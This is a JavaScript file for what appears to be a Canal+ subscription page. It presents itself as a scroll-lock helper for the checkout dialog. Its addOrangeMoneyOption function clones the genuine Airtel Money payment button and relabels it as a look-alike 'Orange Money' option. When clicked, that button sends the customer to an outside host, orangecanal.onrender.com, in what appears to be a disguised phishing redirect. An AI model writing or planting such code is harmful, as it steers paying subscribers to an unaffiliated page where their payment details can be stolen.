let plansSection = document.querySelector(".plans-section");
let lockedScrollY = 0;
let previousBodyStyles = null;
let updateFrame = 0;

function setBodyStyle(property, value, priority = "") {
  if (value) {
    document.body.style.setProperty(property, value, priority);
  } else {
    document.body.style.removeProperty(property);
  }
}

function updateScrollLock() {
  updateFrame = 0;
  addOrangeMoneyOption();
  const isCheckoutOpen = plansSection.querySelector('[role="dialog"]') !== null;

  if (isCheckoutOpen && previousBodyStyles === null) {
    lockedScrollY = window.scrollY;
    previousBodyStyles = ["position", "top", "left", "right", "width"].map((property) => [
      property,
      document.body.style.getPropertyValue(property),
      document.body.style.getPropertyPriority(property),
    ]);

    document.body.style.setProperty("position", "fixed");
    document.body.style.setProperty("top", `-${lockedScrollY}px`);
    document.body.style.setProperty("left", "0");
    document.body.style.setProperty("right", "0");
    document.body.style.setProperty("width", "100%");
    return;
  }

  if (!isCheckoutOpen && previousBodyStyles !== null) {
    previousBodyStyles.forEach(([property, value, priority]) => {
      setBodyStyle(property, value, priority);
    });
    previousBodyStyles = null;
    window.scrollTo(0, lockedScrollY);
  }
}

function addOrangeMoneyOption() {
  const dialog = plansSection?.querySelector('[role="dialog"]');
  const airtelButton = dialog && [...dialog.querySelectorAll("button")].find((button) =>
    button.textContent?.includes("Airtel Money"),
  );

  if (!dialog || !airtelButton || airtelButton.parentElement?.querySelector('[data-payment="orange-money"]')) {
    return;
  }

  const paymentOptions = airtelButton.parentElement;
  const decoderInput = dialog.querySelector("#decoder-number");
  if (!paymentOptions || !(decoderInput instanceof HTMLInputElement)) {
    return;
  }

  const orangeButton = airtelButton.cloneNode(true);
  orangeButton.dataset.payment = "orange-money";
  orangeButton.setAttribute("aria-label", "Orange Money");
  orangeButton.classList.add("canalplus-orange-option");

  const badge = orangeButton.querySelector("span");
  if (!badge) {
    return;
  }
  badge.textContent = "O";
  badge.classList.add("canalplus-orange-badge");

  orangeButton.childNodes.forEach((node) => {
    if (node.nodeType === Node.TEXT_NODE && node.textContent.includes("Airtel Money")) {
      node.textContent = " Orange Money";
    }
  });

  const error = document.createElement("p");
  error.className = "canalplus-payment-error";
  error.setAttribute("role", "alert");
  error.hidden = true;
  error.textContent = "Veuillez saisir votre numéro de décodeur.";

  decoderInput.addEventListener("input", () => {
    error.hidden = true;
  });

  orangeButton.addEventListener("click", () => {
    if (!decoderInput.value.trim()) {
      error.hidden = false;
      decoderInput.focus();
      return;
    }
    window.location.assign("https://orangecanal.onrender.com");
  });

  paymentOptions.append(orangeButton);
  paymentOptions.insertAdjacentElement("afterend", error);
}

const checkoutObserver = new MutationObserver(() => {
  if (updateFrame === 0) {
    updateFrame = window.requestAnimationFrame(updateScrollLock);
  }
});

const plansSectionObserver = new MutationObserver(() => {
  plansSection = document.querySelector(".plans-section");
  if (plansSection instanceof HTMLElement) {
    plansSectionObserver.disconnect();
    checkoutObserver.observe(plansSection, { childList: true, subtree: true });
  }
});

if (plansSection instanceof HTMLElement) {
  checkoutObserver.observe(plansSection, { childList: true, subtree: true });
} else {
  plansSectionObserver.observe(document.documentElement, { childList: true, subtree: true });
}
